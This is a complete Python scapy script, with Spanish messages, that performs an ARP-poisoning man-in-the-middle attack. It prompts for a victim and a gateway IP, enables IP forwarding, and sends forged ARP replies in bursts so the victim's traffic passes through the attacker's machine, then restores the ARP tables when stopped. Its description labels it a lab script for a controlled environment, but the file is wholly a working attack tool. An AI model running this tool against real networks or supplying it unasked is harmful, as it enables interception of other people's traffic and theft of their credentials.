import argparse
import ipaddress
import os
import signal
import subprocess
import sys
import time
from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp

running = True

def stop_handler(sig, frame):
    global running
    running = False

signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)

def require_root():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("Ejecuta con sudo")
        sys.exit(1)

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
    except Exception:
        return ""

def valid_ip(value):
    try:
        ipaddress.ip_address(value)
        return True
    except Exception:
        return False

def interface_exists(iface):
    return os.path.exists(f"/sys/class/net/{iface}")

def list_interfaces():
    interfaces = []

    for iface in sorted(os.listdir("/sys/class/net")):
        if iface == "lo":
            continue

        if os.path.exists(f"/sys/class/net/{iface}"):
            interfaces.append(iface)

    return interfaces

def get_ip_line(iface):
    line = run_cmd(["ip", "-br", "addr", "show", iface])
    return line if line else iface

def ask_interface():
    interfaces = list_interfaces()

    if not interfaces:
        print("No se encontraron interfaces de red")
        sys.exit(1)

    print("")
    print("Interfaces disponibles:")
    print("")

    for idx, iface in enumerate(interfaces, 1):
        print(f"{idx}. {get_ip_line(iface)}")

    print("")

    default_iface = "eth1" if "eth1" in interfaces else interfaces[0]
    value = input(f"Interfaz que usará el ataque [Enter = {default_iface}]: ").strip()

    if value == "":
        return default_iface

    if value.isdigit():
        pos = int(value)

        if 1 <= pos <= len(interfaces):
            return interfaces[pos - 1]

    if value in interfaces:
        return value

    print(f"Interfaz inválida: {value}")
    sys.exit(1)

def ask_ip(label, default_ip):
    value = input(f"{label} [Enter = {default_ip}]: ").strip()

    if value == "":
        value = default_ip

    if not valid_ip(value):
        print(f"IP inválida: {value}")
        sys.exit(1)

    return value

def get_mac(ip, iface, timeout=2, retry=5):
    conf.verb = 0

    for _ in range(retry):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
        answers, _ = srp(packet, iface=iface, timeout=timeout, verbose=False)

        for _, received in answers:
            return received.hwsrc

    return None

def read_sysctl(path):
    try:
        with open(path, "r") as f:
            return f.read().strip()
    except Exception:
        return None

def write_sysctl(path, value):
    try:
        with open(path, "w") as f:
            f.write(str(value))
        return True
    except Exception:
        return False

def prepare_forwarding(iface):
    old_values = {}

    paths = [
        "/proc/sys/net/ipv4/ip_forward",
        "/proc/sys/net/ipv4/conf/all/send_redirects",
        "/proc/sys/net/ipv4/conf/default/send_redirects",
        f"/proc/sys/net/ipv4/conf/{iface}/send_redirects"
    ]

    for path in paths:
        old_values[path] = read_sysctl(path)

    write_sysctl("/proc/sys/net/ipv4/ip_forward", "1")
    write_sysctl("/proc/sys/net/ipv4/conf/all/send_redirects", "0")
    write_sysctl("/proc/sys/net/ipv4/conf/default/send_redirects", "0")
    write_sysctl(f"/proc/sys/net/ipv4/conf/{iface}/send_redirects", "0")

    return old_values

def restore_sysctl(old_values):
    for path, value in old_values.items():
        if value is not None:
            write_sysctl(path, value)

def poison_once(iface, attacker_mac, target_ip, target_mac, gateway_ip, gateway_mac):
    packet_to_target = (
        Ether(src=attacker_mac, dst=target_mac) /
        ARP(
            op=2,
            psrc=gateway_ip,
            hwsrc=attacker_mac,
            pdst=target_ip,
            hwdst=target_mac
        )
    )

    packet_to_gateway = (
        Ether(src=attacker_mac, dst=gateway_mac) /
        ARP(
            op=2,
            psrc=target_ip,
            hwsrc=attacker_mac,
            pdst=gateway_ip,
            hwdst=gateway_mac
        )
    )

    sendp(packet_to_target, iface=iface, verbose=False)
    sendp(packet_to_gateway, iface=iface, verbose=False)

def poison_burst(iface, attacker_mac, target_ip, target_mac, gateway_ip, gateway_mac, burst):
    for _ in range(burst):
        poison_once(
            iface,
            attacker_mac,
            target_ip,
            target_mac,
            gateway_ip,
            gateway_mac
        )

def restore_arp(iface, target_ip, target_mac, gateway_ip, gateway_mac, count):
    print("")
    print("Restaurando tablas ARP")

    packet_to_target = (
        Ether(src=gateway_mac, dst=target_mac) /
        ARP(
            op=2,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
            pdst=target_ip,
            hwdst=target_mac
        )
    )

    packet_to_gateway = (
        Ether(src=target_mac, dst=gateway_mac) /
        ARP(
            op=2,
            psrc=target_ip,
            hwsrc=target_mac,
            pdst=gateway_ip,
            hwdst=gateway_mac
        )
    )

    for _ in range(count):
        sendp(packet_to_target, iface=iface, verbose=False)
        sendp(packet_to_gateway, iface=iface, verbose=False)
        time.sleep(0.2)

    print("Restauración enviada")

def main():
    parser = argparse.ArgumentParser(
        description="ARP MitM lab script para entorno controlado"
    )

    parser.add_argument("-i", "--iface", default=None)
    parser.add_argument("-t", "--target", default=None)
    parser.add_argument("-g", "--gateway", default=None)
    parser.add_argument("--interval", type=float, default=0.15)
    parser.add_argument("--burst", type=int, default=10)
    parser.add_argument("--duration", type=int, default=0)
    parser.add_argument("--restore-count", type=int, default=10)
    parser.add_argument("--no-restore", action="store_true")
    parser.add_argument("--no-forward", action="store_true")
    parser.add_argument("--yes", action="store_true")

    args = parser.parse_args()

    require_root()

    if args.iface is None:
        args.iface = ask_interface()

    if not interface_exists(args.iface):
        print(f"La interfaz {args.iface} no existe")
        print("Interfaces disponibles:")
        os.system("ip -br a")
        sys.exit(1)

    if args.target is None:
        args.target = ask_ip("IP de la víctima", "192.168.58.2")

    if args.gateway is None:
        args.gateway = ask_ip("IP del gateway", "192.168.58.1")

    if not valid_ip(args.target):
        print(f"IP víctima inválida: {args.target}")
        sys.exit(1)

    if not valid_ip(args.gateway):
        print(f"IP gateway inválida: {args.gateway}")
        sys.exit(1)

    conf.iface = args.iface

    try:
        attacker_mac = get_if_hwaddr(args.iface)
    except Exception:
        print(f"No pude obtener la MAC de {args.iface}")
        sys.exit(1)

    print("")
    print("Configuración ARP MitM:")
    print(f"iface={args.iface}")
    print(f"iface_info={get_ip_line(args.iface)}")
    print(f"attacker_mac={attacker_mac}")
    print(f"target_ip={args.target}")
    print(f"gateway_ip={args.gateway}")
    print(f"interval={args.interval}")
    print(f"burst={args.burst}")
    print(f"duration={args.duration}")
    print("")

    if not args.yes:
        confirm = input("Presiona Enter para iniciar o escribe n para cancelar: ").strip().lower()

        if confirm in ["n", "no", "cancel", "cancelar"]:
            print("Cancelado")
            sys.exit(0)

    print("")
    print("Resolviendo MAC de la víctima y del gateway")

    target_mac = get_mac(args.target, args.iface)
    gateway_mac = get_mac(args.gateway, args.iface)

    if target_mac is None:
        print(f"No pude resolver la MAC de la víctima {args.target}")
        print("Verifica que la víctima esté encendida y tenga conectividad")
        sys.exit(1)

    if gateway_mac is None:
        print(f"No pude resolver la MAC del gateway {args.gateway}")
        print("Verifica que el router esté encendido y tenga conectividad")
        sys.exit(1)

    print(f"target_mac={target_mac}")
    print(f"gateway_mac={gateway_mac}")

    old_sysctl = {}

    if not args.no_forward:
        old_sysctl = prepare_forwarding(args.iface)
        print("IP forwarding activado")

    print("")
    print("Ataque ARP MitM iniciado. Usa Ctrl+C para detener")
    print("")

    start = time.time()
    last = start
    rounds = 0
    end_time = start + args.duration if args.duration > 0 else 0

    try:
        while running:
            if end_time and time.time() >= end_time:
                break

            poison_burst(
                args.iface,
                attacker_mac,
                args.target,
                target_mac,
                args.gateway,
                gateway_mac,
                args.burst
            )

            rounds += 1
            now = time.time()

            if now - last >= 2:
                packets = rounds * args.burst * 2
                elapsed = now - start
                pps = packets / max(elapsed, 0.001)

                print(
                    f"rounds={rounds} packets={packets} "
                    f"avg_pps={pps:.0f} elapsed={elapsed:.0f}s"
                )

                last = now

            time.sleep(args.interval)

    finally:
        if not args.no_restore:
            restore_arp(
                args.iface,
                args.target,
                target_mac,
                args.gateway,
                gateway_mac,
                args.restore_count
            )

        if old_sysctl:
            restore_sysctl(old_sysctl)
            print("Configuración de forwarding restaurada")

        print("")
        print("Finalizado")

if __name__ == "__main__":
    main()
